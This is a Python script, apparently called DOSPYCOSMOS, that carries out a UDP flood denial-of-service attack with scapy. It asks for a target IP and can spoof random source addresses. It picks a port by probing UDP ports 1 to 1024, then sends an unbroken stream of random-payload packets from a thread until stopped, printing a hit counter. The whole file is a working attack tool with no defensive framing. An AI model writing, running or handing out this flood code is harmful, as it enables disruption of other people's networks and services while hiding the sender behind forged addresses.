import os, sys, subprocess, random, time, threading
from scapy.all import IP, UDP, Raw, send, sr1

def install(package):
    subprocess.call([sys.executable, "-m", "pip", "install", package])

try:
    from colorama import Fore, Style
except:
    install("colorama")
    from colorama import Fore, Style

try:
    from scapy.all import *
except:
    install("scapy")
    from scapy.all import *

GREEN = Fore.GREEN

print(GREEN + "\n===== DOSPYCOSMOS =====\n" + Style.RESET_ALL)

target_ip = input(GREEN + "Target IP: " + Style.RESET_ALL)
spoof_choice = input(GREEN + "Spoof source IP? (y/n): " + Style.RESET_ALL).lower()
speed_choice = int(input(GREEN + "Speed (50/100/200/500 MB): " + Style.RESET_ALL))

speed_map = {50: 0.01, 100: 0.005, 200: 0.002, 500: 0.001}
delay = speed_map.get(speed_choice, 0.01)

open_ports = []
for port in range(1, 1025):
    ans = sr1(IP(dst=target_ip)/UDP(dport=port), timeout=0.5, verbose=0)
    if ans is None:
        open_ports.append(port)

if not open_ports:
    target_port = 80
else:
    target_port = random.choice(open_ports)

print(GREEN + f"Using target port {target_port}" + Style.RESET_ALL)

stop_flag = False

def attack():
    global stop_flag
    hits = 0
    while not stop_flag:
        if spoof_choice == "y":
            src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        else:
            src_ip = None
        payload_size = random.randint(1000, 1500)
        payload = os.urandom(payload_size)
        pkt = IP(dst=target_ip) / UDP(sport=random.randint(1024, 65535), dport=target_port) / Raw(load=payload)
        if src_ip:
            pkt[IP].src = src_ip
        send(pkt, verbose=0)
        hits += 1
        print(GREEN + f"HITS: {hits} | {payload_size} bytes -> {target_ip}:{target_port}" + Style.RESET_ALL)
        time.sleep(delay)

def wait_for_enter():
    global stop_flag
    input(GREEN + "\nPress ENTER to stop...\n" + Style.RESET_ALL)
    stop_flag = True

threading.Thread(target=attack).start()
wait_for_enter()
print(GREEN + "Attack stopped." + Style.RESET_ALL)